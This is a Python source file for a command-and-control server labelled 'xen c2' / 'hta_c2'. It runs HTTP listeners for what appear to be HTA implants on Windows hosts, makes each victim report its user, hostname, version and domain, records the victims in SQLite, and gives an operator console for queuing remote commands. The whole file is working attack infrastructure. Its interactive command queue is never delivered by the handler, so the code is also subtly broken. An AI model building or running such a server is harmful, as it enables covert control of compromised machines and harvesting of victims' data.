from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import base64
import os
import readline
import socket
import threading
import datetime
import uuid
import sqlite3
import random
import time

DB_PATH = os.path.join(os.path.dirname(__file__), "server_config.db")
HISTORY_FILE = os.path.expanduser("~/.hta_c2_history")

listeners = {}
listeners_lock = threading.Lock()

sessions = {}
sessions_lock = threading.Lock()

seen_clients = {}
seen_clients_lock = threading.Lock()

notifications = []
notifications_lock = threading.Lock()
notified_sessions = set()
notified_sessions_lock = threading.Lock()


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
    CREATE TABLE IF NOT EXISTS listeners (
        listener_id TEXT PRIMARY KEY,
        lhost TEXT,
        lport INTEGER UNIQUE,
        created_at TEXT
    )
    ''')
    c.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        username TEXT,
        hostname TEXT,
        windows_ver TEXT,
        domain TEXT,
        src_ip TEXT,
        initial_conn TEXT,
        check_in TEXT
    )
    ''')
    conn.commit()
    conn.close()


def db_add_session(session_id, username, hostname, windows_ver, domain, src_ip, initial_conn):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT session_id FROM sessions WHERE username = ? AND hostname = ? AND src_ip = ?', (username, hostname, src_ip))
    if c.fetchone():
        conn.close()
        return False
    c.execute('''
        INSERT INTO sessions (session_id, username, hostname, windows_ver, domain, src_ip, initial_conn, check_in)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (session_id, username, hostname, windows_ver, domain, src_ip, initial_conn, initial_conn))
    conn.commit()
    conn.close()
    return True


def db_get_listeners():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT listener_id, lhost, lport, created_at FROM listeners')
    rows = c.fetchall()
    conn.close()
    return rows


def db_add_listener(lhost, lport):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS listeners (listener_id TEXT PRIMARY KEY, lhost TEXT, lport INTEGER UNIQUE, created_at TEXT)')
    c.execute('SELECT listener_id FROM listeners WHERE lport = ?', (lport,))
    row = c.fetchone()
    if row:
        conn.close()
        return row[0]
    lid = str(uuid.uuid4())
    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    c.execute('INSERT INTO listeners (listener_id, lhost, lport, created_at) VALUES (?, ?, ?, ?)', (lid, lhost, lport, now))
    conn.commit()
    conn.close()
    return lid


def db_remove_listener(lport):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM listeners WHERE lport = ?', (lport,))
    conn.commit()
    conn.close()


def push_notification(msg, session_id=None):
    with notifications_lock:
        # avoid exact duplicate notification for same session_id
        if session_id:
            with notified_sessions_lock:
                if session_id in notified_sessions:
                    return
                notified_sessions.add(session_id)
        notifications.append(msg)


def pop_notifications():
    msgs = []
    with notifications_lock:
        while notifications:
            msgs.append(notifications.pop(0))
    return msgs


class HTAHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path
        raw = ""
        if path.startswith("/?arg="):
            raw = path[6:]
        # Ensure client state exists
        with seen_clients_lock:
            state = seen_clients.get(client_ip)
            if state is None:
                seen_clients[client_ip] = {
                    "bulk": "",
                    "queue": [],          # queued commands to send to client
                    "last_cmd": None,     # last sent command
                    "collected": {},      # collected outputs
                    "created_at": None,
                    "session_id": None
                }
                state = seen_clients[client_ip]

        if raw == "":
            with seen_clients_lock:
                # first contact or poll without payload: initialize queue if empty
                if not state["queue"]:
                    state["queue"] = ["whoami", "hostname", "ver", "echo %USERDOMAIN%"]
                    state["created_at"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
                next_cmd = state["queue"].pop(0) if state["queue"] else ""
                state["last_cmd"] = next_cmd
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            if next_cmd:
                try:
                    self.wfile.write(bytes(next_cmd, "utf-8"))
                except BrokenPipeError:
                    pass
            return

        # there is some payload -> accumulate
        with seen_clients_lock:
            state["bulk"] += raw
            if "*" in raw:
                full = state["bulk"]
                full = full.rstrip("*")
                pads = len(full) % 4
                if pads != 0:
                    full += "=" * (4 - pads)
                try:
                    decoded = base64.b64decode(full)
                    output = decoded.decode("utf-8", errors="ignore")
                except Exception:
                    output = ""
                state["bulk"] = ""
                last = state.get("last_cmd")
                if last:
                    state["collected"][last] = output.strip()
                # if queue has more commands, send next
                if state["queue"]:
                    next_cmd = state["queue"].pop(0)
                    state["last_cmd"] = next_cmd
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    try:
                        self.wfile.write(bytes(next_cmd, "utf-8"))
                    except BrokenPipeError:
                        pass
                    return
                # finalize session if not created
                if not state.get("session_id"):
                    username = state["collected"].get("whoami", "").strip()
                    if "\\" in username:
                        domain, username_only = username.split("\\", 1)
                    else:
                        username_only = username or "unknown"
                        domain = ""
                    hostname = state["collected"].get("hostname", "").strip() or "unknown"
                    windows_ver = state["collected"].get("ver", "").strip() or "unknown"
                    domain_out = state["collected"].get("echo %USERDOMAIN%", "").strip() or domain or "unknown"
                    created_at = state["created_at"] or datetime.datetime.now(datetime.timezone.utc).isoformat()
                    def gen_id():
                        return "{:06d}".format(random.randint(0, 999999))
                    sid = gen_id()
                    with sessions_lock:
                        while sid in sessions:
                            sid = gen_id()
                        # check DB for duplicates by username+hostname+src_ip
                        conn = sqlite3.connect(DB_PATH)
                        c = conn.cursor()
                        c.execute('SELECT session_id FROM sessions WHERE username = ? AND hostname = ? AND src_ip = ?', (username_only, hostname, client_ip))
                        row = c.fetchone()
                        if row:
                            sid = row[0]
                        else:
                            db_add_session(sid, username_only, hostname, windows_ver, domain_out, client_ip, created_at)
                        conn.close()
                        sessions[sid] = {
                            "username": username_only,
                            "hostname": hostname,
                            "windows_ver": windows_ver,
                            "domain": domain_out,
                            "created_at": created_at,
                            "src_ip": client_ip,
                            "queue": []
                        }
                        state["session_id"] = sid
                    push_notification(f"[+] New session from {hostname}/{username_only} connected (ID: {sid})", session_id=sid)
                # reply empty
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                try:
                    self.wfile.write(b"")
                except BrokenPipeError:
                    pass
                return

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        try:
            self.wfile.write(b"")
        except BrokenPipeError:
            pass

    def log_message(self, format, *args):
        return


def _serve_http(port, listener_id):
    server = HTTPServer(('', port), HTAHandler)
    server.cmds = []
    with listeners_lock:
        if listener_id in listeners:
            listeners[listener_id]["server"] = server
    try:
        server.serve_forever()
    except Exception:
        pass
    finally:
        try:
            server.server_close()
        except Exception:
            pass


def start_listener(lhost, lport):
    with listeners_lock:
        for info in listeners.values():
            if info["port"] == lport:
                print("\033[91m[!] Listener already running on port {}\033[0m".format(lport))
                return None
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            test_sock.bind((lhost, lport))
            test_sock.close()

            listener_id = db_add_listener(lhost, lport)
            t = threading.Thread(target=_serve_http, args=(lport, listener_id), daemon=True)
            listeners[listener_id] = {
                "host": lhost,
                "port": lport,
                "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                "thread": t
            }
            t.start()
            print("\033[92m[+] Listener {} started on {}:{}\033[0m".format(listener_id, lhost, lport))
            return listener_id
        except OSError as e:
            if getattr(e, "errno", None) == 98:
                print("\033[91m[!] Port {} in use. Kill before restarting.\033[0m".format(lport))
            else:
                print("\033[91m[!] Failed to start listener on {}:{} — {}\033[0m".format(lhost, lport, e))
            return None


def kill_listener(lport):
    removed = False
    with listeners_lock:
        for listener_id, info in list(listeners.items()):
            if info["port"] == lport:
                try:
                    srv = info.get("server")
                    if srv:
                        try:
                            srv.shutdown()
                        except Exception:
                            pass
                        try:
                            srv.server_close()
                        except Exception:
                            pass
                    if info.get("thread") and info["thread"].is_alive():
                        info["thread"].join(timeout=1)
                    del listeners[listener_id]
                    db_remove_listener(lport)
                    print("\033[92m[-] Listener on port {} stopped\033[0m".format(lport))
                    removed = True
                    break
                except Exception as e:
                    print("\033[91m[!] Failed to stop listener on port {} — {}\033[0m".format(lport, e))
                    return False
    if not removed:
        db_remove_listener(lport)
        print("\033[94m[*] No active listener found, removed DB entry for port {}\033[0m".format(lport))
    return removed


def list_listeners():
    with listeners_lock:
        if not listeners:
            print("[*] No active listeners.")
            return
        headers = ["ID", "Host", "Port", "Created At"]
        rows = []
        for listener_id, info in listeners.items():
            rows.append([listener_id, info["host"], str(info["port"]), info["created_at"]])
        col_widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(4)]
        top = '┌' + '┬'.join('─'*(col_widths[i]+2) for i in range(4)) + '┐'
        sep = '├' + '┼'.join('─'*(col_widths[i]+2) for i in range(4)) + '┤'
        bottom = '└' + '┴'.join('─'*(col_widths[i]+2) for i in range(4)) + '┘'
        print(top)
        print('│ ' + ' │ '.join(headers[i].ljust(col_widths[i]) for i in range(4)) + ' │')
        print(sep)
        for row in rows:
            print('│ ' + ' │ '.join(str(row[i]).ljust(col_widths[i]) for i in range(4)) + ' │')
        print(bottom)


def list_sessions():
    # flush notifications first so new sessions appear before listing
    for m in pop_notifications():
        print(m)
    with sessions_lock:
        if not sessions:
            print("[*] No active sessions.")
            return
        headers = ["ID", "Username", "Hostname", "Windows", "Domain", "Created At"]
        rows = []
        for sid, info in sessions.items():
            rows.append([sid, info["username"], info["hostname"], info["windows_ver"], info["domain"], info["created_at"]])
        col_widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(6)]
        top = '┌' + '┬'.join('─'*(col_widths[i]+2) for i in range(6)) + '┐'
        sep = '├' + '┼'.join('─'*(col_widths[i]+2) for i in range(6)) + '┤'
        bottom = '└' + '┴'.join('─'*(col_widths[i]+2) for i in range(6)) + '┘'
        print(top)
        print('│ ' + ' │ '.join(headers[i].ljust(col_widths[i]) for i in range(6)) + ' │')
        print(sep)
        for row in rows:
            print('│ ' + ' │ '.join(str(row[i]).ljust(col_widths[i]) for i in range(6)) + ' │')
        print(bottom)


def enqueue_command_for_session(session_id, cmd):
    with sessions_lock:
        s = sessions.get(session_id)
        if not s:
            return False
        s["queue"].append(cmd)
    return True


def pop_session_command(session_id):
    with sessions_lock:
        s = sessions.get(session_id)
        if not s:
            return None
        if s["queue"]:
            return s["queue"].pop(0)
    return None


def load_existing_listeners():
    init_db()
    rows = db_get_listeners()
    for listener_id, lhost, lport, created in rows:
        try:
            start_listener(lhost, lport)
        except Exception:
            db_remove_listener(lport)


def repl():
    load_existing_listeners()
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass


    banner = r'''
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌
▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌                    ▐░▌
▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌           ▄▄▄▄▄▄▄▄▄█░▌
▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌     ▐░▌          ▐░░░░░░░░░░░▌
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀         ▀       ▀       ▀         ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
        '''
    print(banner)
    print("xen c2. type 'help'")

    help_text = """Commands:
    help                  show this help
    listener start <lhost> <lport>     start HTTP listener
    listener list                      list active listeners
    interact <session id>              interact with a session
    listener kill <lport>              stop listener
    exit                               stop server"""

    while True:
        for m in pop_notifications():
            print(m)

        try:
            line = input("hta_c2 >> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        readline.add_history(line)

        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "help":
            print(help_text)
        elif cmd == "listener":
            if len(parts) < 2:
                print("listener start <lhost> <lport> | listener list | listener kill <lport>")
                continue
            action = parts[1].lower()
            if action == "start" and len(parts) == 4:
                lhost, lport = parts[2], int(parts[3])
                start_listener(lhost, lport)
            elif action == "list":
                list_listeners()
            elif action == "kill" and len(parts) == 3:
                kill_listener(int(parts[2]))
            else:
                print("Unknown listener action")
        elif cmd == "interact":
            if len(parts) == 1:
                print("interact list | interact <session_id>")
            elif parts[1].lower() == "list":
                list_sessions()
            else:
                sid = parts[1]
                with sessions_lock:
                    s = sessions.get(sid)
                if not s:
                    print("session not found")
                else:
                    # simple interactive loop that queues commands and prints notifications
                    try:
                        while True:
                            # show any notifications
                            for m in pop_notifications():
                                print(m)
                            cmdline = input(f"{s['hostname']}\\{s['username']} ({sid}) >> ").strip()
                            if not cmdline:
                                continue
                            if cmdline.lower() in ("exit", "quit"):
                                break
                            enqueue_command_for_session(sid, cmdline)
                    except KeyboardInterrupt:
                        print()
        elif cmd == "exit":
            break
        else:
            print("unknown command")

    readline.write_history_file(HISTORY_FILE)


if __name__ == '__main__':
    repl()
